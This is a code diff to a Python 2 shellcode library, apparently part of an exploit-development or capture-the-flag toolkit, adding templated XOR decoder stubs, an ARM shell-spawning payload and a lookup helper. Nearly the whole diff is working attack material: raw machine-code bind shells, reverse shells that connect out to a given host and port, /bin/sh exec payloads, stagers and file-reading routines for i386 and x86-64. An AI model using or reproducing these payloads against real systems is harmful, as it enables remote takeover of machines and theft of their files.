@@ -808,7 +808,7 @@ class Shellcode(object):
             'alnum_stager': 'Yh3333k4dsFkDqG02DqH0D10u03P3H1o0j2B0207393s3q103a8P7l3j4s3B065k3O4N8N8O03',
             'bind_shell': '\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x66\x68${port}\x66\x6a\x02\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80',
             'reverse_shell': '\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68${host}\x66\x68${port}\x66\x6a\x02\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80',
-            'xor': '\xeb\x0f\x5e\x80\x36\x00\x74\x0e\x46\xeb\xf8\x00\x00\x00\x00\x00\x00\xe8\xec\xff\xff\xff',
+            'xor': '\xeb\x0f\x5e\x80\x36${key}\x74\x0e\x46\xeb\xf8${key}${key}${key}${key}${key}${key}\xe8\xec\xff\xff\xff',
         },
         'x86-64': {
             'noppairs': ['PX', 'QY', 'RZ'],
@@ -822,8 +822,11 @@ class Shellcode(object):
             'alnum_stager': 'h0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M367p0h1O0A8O7p5L2x01193i4m7k08144L7m1M3K043I3A8L4V8K0m',
             'bind_shell': '\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\xba\xf2\xff${port}\x66\x83\xf2\xf0\x52\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
             'reverse_shell': '\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x68${host}\x66\x68${port}\x66\x6a\x02\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
-            'xor': '\xeb\x0f\x5e\x80\x36\x00\x74\x0e\x48\xff\xc6\xeb\xf6\x00\x00\x00\x00\xe8\xec\xff\xff\xff',
-        }
+            'xor': '\xeb\x0f\x5e\x80\x36${key}\x74\x0e\x48\xff\xc6\xeb\xf6${key}${key}${key}${key}\xe8\xec\xff\xff\xff',
+        },
+        'arm': {
+            'exec_shell': '\x01\x70\x8f\xe2\x17\xff\x2f\xe1\x04\xa7\x03\xcf\x52\x40\x07\xb4\x68\x46\x05\xb4\x69\x46\x0b\x27\x01\xdf\x01\x01\x2f\x62\x69\x6e\x2f\x2f\x73\x68',
+        },
     }
 
     def __init__(self, arch):
@@ -831,8 +834,17 @@ class Shellcode(object):
             raise Exception("unsupported architechture: %r" % arch)
         self.arch = arch
 
+    def get(self, name, **kwargs):
+        if name not in self._database[self.arch]:
+            raise Exception("unsupported shellcode for %s architecture: %r" % (arch, name))
+
+        sc = self._database[self.arch][name]
+        for k, v in kwargs.iteritems():
+            sc = sc.replace("${%s}" % k, v)
+        return sc
+
     def nopfill(self, code, size, buf=''):
-        noppairs = self._database[self.arch]['noppairs']
+        noppairs = self.get('noppairs')
         buflen = size - len(buf) - len(code)
         assert buflen >= 0, "%d bytes over" % (-buflen,)
         buf = ''
@@ -841,53 +853,53 @@ class Shellcode(object):
         return buf[:buflen] + code
 
     def exec_shell(self):
-        return self._database[self.arch]['exec_shell']
+        return self.get('exec_shell')
 
     def exec_command(self, command):
-        return self._database[self.arch]['exec_command'] + chr(len(command)) + command
+        return self.get('exec_command') + chr(len(command)) + command
 
     def dup(self, code, fd):
-        return self._database[self.arch]['dup'].replace('${fd}', chr(fd)) + code
+        return self.get('dup', fd=chr(fd)) + code
 
     def cat(self, path):
-        return self._database[self.arch]['cat'] + chr(len(path)) + path
+        return self.get('cat') + chr(len(path)) + path
 
     def sendfile(self, path, fd=1):
-        return self._database[self.arch]['sendfile'].replace('${fd}', chr(fd)) + chr(len(path)) + path
+        return self.get('sendfile', fd=chr(fd)) + chr(len(path)) + path
 
     def read_stager(self):
-        return self._database[self.arch]['read_stager']
+        return self.get('read_stager')
 
     def mmap_stager(self):
-        return self._database[self.arch]['mmap_stager']
+        return self.get('mmap_stager')
 
     def alnum_stager(self, reg):
         if self.arch == 'i386':
             r = ['eax', 'ecx', 'edx', 'ebx', 'esi', 'edi', 'esi', 'edi'].index(reg)
-            return chr(0x50+r) + self._database[self.arch]['alnum_stager']
+            return chr(0x50+r) + self.get('alnum_stager')
         elif self.arch == 'x86-64':
             r = ['rax', 'rcx', 'rdx', 'rbx', 'rsi', 'rdi', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15'].index(reg)
             if r >= 8:
-                return '\x41' + chr(0x50+(r-8)) + self._database[self.arch]['alnum_stager']
+                return '\x41' + chr(0x50+(r-8)) + self.get('alnum_stager')
             else:
-                return chr(0x50+r) + self._database[self.arch]['alnum_stager']
+                return chr(0x50+r) + self.get('alnum_stager')
         else:
-            raise Exception("unsupported architecture: %s" % self.arch)
+            raise Exception("unsupported architecture: %r" % self.arch)
 
     def bind_shell(self, port):
         p = struct.pack('>H', port)
-        return self._database[self.arch]['bind_shell'].replace('${port}', p)
+        return self.get('bind_shell', port=p)
 
     def reverse_shell(self, host, port):
         addrinfo = socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_STREAM)
         h, p = addrinfo[0][4]
         h = socket.inet_aton(h)
         p = struct.pack('>H', p)
-        return self._database[self.arch]['reverse_shell'].replace('${host}', h).replace('${port}', p)
+        return self.get('reverse_shell', host=h, port=p)
 
     def xor(self, code, badchars='\t\n\v\f\r '):
         for key in xrange(0x100):
-            decoder = self._database[self.arch]['xor'].replace('\x00', chr(key))
+            decoder = self.get('xor', key=chr(key))
             encoded_code = str(bytearray(c^key for c in bytearray(code)))
             result = decoder + encoded_code + chr(key)
             if all(c not in result for c in badchars):
